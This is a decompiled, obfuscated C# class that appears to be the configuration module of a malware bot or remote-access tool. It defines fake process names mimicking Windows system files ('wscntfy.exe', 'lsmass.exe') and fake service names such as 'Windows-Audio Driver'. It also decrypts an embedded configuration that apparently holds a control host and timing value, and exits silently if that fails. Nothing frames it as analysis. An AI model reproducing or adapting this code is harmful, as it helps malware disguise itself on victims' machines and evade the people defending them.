using System;
using System.Diagnostics;

namespace ns0;

internal class Class2
{
	public static string string_0 = null;

	public static string string_1 = null;

	public static int int_0 = 60;

	public static int int_1 = 30;

	public static string uI = ZC.smethod_0();

	public static bool bool_0 = ZC.smethod_3();

	public static ushort ushort_0 = 0;

	public static int int_2 = 5;

	public static string[] string_2 = new string[2] { "wscntfy.exe", "lsmass.exe" };

	public static string[] string_3 = new string[3]
	{
		"Windows-Audio Driver",
		"Windows-Network Component",
		string.Empty
	};

	public static string string_4 = Process.GetCurrentProcess().get_MainModule().get_FileName();

	public static void smethod_0()
	{
		try
		{
			string text = Class12.smethod_10((IntPtr)1);
			string text2 = Class12.smethod_10((IntPtr)2);
			Class12.smethod_3(ref text);
			Class12.smethod_4(ref text2, text);
			string[] array = text2.Split(new char[1] { '|' }, StringSplitOptions.RemoveEmptyEntries);
			if (array.Length == 3)
			{
				string_0 = Convert.ToString(array[0]);
				string_1 = Convert.ToString(array[1]);
				int_0 = Convert.ToInt32(array[2]);
			}
			else
			{
				Environment.Exit(0);
			}
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
